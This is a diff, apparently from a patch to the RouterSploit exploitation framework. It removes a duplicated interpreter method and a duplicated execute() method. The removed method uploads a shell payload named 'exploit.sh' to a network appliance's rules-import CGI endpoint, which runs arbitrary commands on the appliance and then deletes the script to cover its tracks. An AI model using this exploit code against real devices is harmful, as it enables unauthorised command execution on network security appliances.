@@ -28,28 +28,6 @@ index 672fcd8..4352b80 100644
 +        finally:
 +            printer_queue.join()
 +
-+    def run_command(self, in_command):
-+        """ Routersploit main entry point. Starting interpreter loop. """
-+
-+        #print_info(self.banner)
-+        printer_queue.join()
-+        try:
-+            command, args, _ = self.parse_line(in_command)
-+            if not command:
-+                pass
-+            command_handler = self.get_command_handler(command)
-+            command_handler(args)
-+        except RoutersploitException as err:
-+            print_error(err)
-+        except EOFError:
-+            print_info()
-+            print_status("routersploit stopped")
-+            return
-+        except KeyboardInterrupt:
-+            print_info()
-+        finally:
-+            printer_queue.join()
-+
      @property
      def module_metadata(self):
          return getattr(self.current_module, "_{}__info__".format(self.current_module.__class__.__name__))
@@ -1263,32 +1241,6 @@ index 16fe990..ca0264e 100644
          print_error("Exploit failed. Could not authenticate.")
          return False
  
-+    def execute(self, cmd):
-+        sh_name = 'exploit.sh'
-+        sf_action_id = self.get_sf_action_id()
-+
-+        payload = "{}; rm /var/sf/SRU/{}".format(cmd, sh_name)
-+
-+        print_status("Attempting to exploit.sh")
-+
-+        multipart_form_data = {
-+            "action_submit": (None, "Import"),
-+            "source": (None, "file"),
-+            "manual_update": (None, "1"),
-+            "sf_action_id": (None, sf_action_id),
-+            "file": (sh_name, payload)
-+        }
-+
-+        self.http_request(
-+            method="POST",
-+            path="/DetectionPolicy/rules/rulesimport.cgi",
-+            files=multipart_form_data,
-+            session=self.session
-+        )
-+
-+        return
-+
-+
 +    def execute(self, cmd):
 +        sh_name = 'exploit.sh'
 +        sf_action_id = self.get_sf_action_id()
